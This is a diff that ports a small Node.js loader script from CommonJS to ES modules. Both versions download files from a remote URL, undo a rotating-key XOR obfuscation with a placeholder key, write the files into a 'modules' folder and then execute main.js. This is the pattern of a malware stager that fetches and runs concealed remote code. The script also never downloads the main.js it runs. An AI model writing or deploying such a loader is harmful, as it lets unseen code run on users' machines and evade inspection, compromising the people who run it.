@@ -1,21 +1,26 @@
-const fs = require("fs");
-const path = require("path");
-const axios = require("axios");
-const crypto = require("crypto");
+// index.js
 
-// Local paths
-const baseDir = path.join(__dirname, "modules");
-const mainModule = "main.js";
-const filesToDownload = ["module1.js", "module2.js"]; // Placeholder
+import fs from 'fs';
+import path from 'path';
+import axios from 'axios';
+import { fileURLToPath } from 'url';
+import { dirname } from 'path';
 
-// Ensure baseDir exists
+// Needed to replicate __dirname in ES modules
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = dirname(__filename);
+
+// Paths
+const baseDir = path.join(__dirname, 'modules');
+const mainModule = 'main.js';
+const filesToDownload = ['module1.js', 'module2.js']; // Placeholder
+
 if (!fs.existsSync(baseDir)) {
   fs.mkdirSync(baseDir);
 }
 
-// Function to decrypt data (simple XOR with rotating key)
 function decrypt(data, key) {
-  let result = "";
+  let result = '';
   let keyIndex = 0;
   for (let i = 0; i < data.length; i++) {
     const charCode = data.charCodeAt(i) ^ key.charCodeAt(keyIndex);
@@ -25,11 +30,10 @@ function decrypt(data, key) {
   return result;
 }
 
-// Download and save a module
 async function downloadAndSave(url, filepath) {
   try {
-    const response = await axios.get(url, { responseType: "arraybuffer" });
-    const decrypted = decrypt(response.data.toString(), "myKey"); // Replace with actual key
+    const response = await axios.get(url, { responseType: 'arraybuffer' });
+    const decrypted = decrypt(response.data.toString(), 'myKey'); // Replace with real key
     fs.writeFileSync(filepath, decrypted);
     console.log(`Saved module to ${filepath}`);
   } catch (error) {
@@ -37,7 +41,6 @@ async function downloadAndSave(url, filepath) {
   }
 }
 
-// Main logic
 (async () => {
   for (let filename of filesToDownload) {
     const filepath = path.join(baseDir, filename);
@@ -45,11 +48,12 @@ async function downloadAndSave(url, filepath) {
     await downloadAndSave(url, filepath);
   }
 
-  // Run main module
+  // Dynamically import the downloaded main module
   const mainPath = path.join(baseDir, mainModule);
   if (fs.existsSync(mainPath)) {
-    require(mainPath);
+    const mainModule = await import(`file://${mainPath}`);
+    console.log('Main module loaded:', mainModule);
   } else {
-    console.error("Main module not found.");
+    console.error('Main module not found.');
   }
 })();
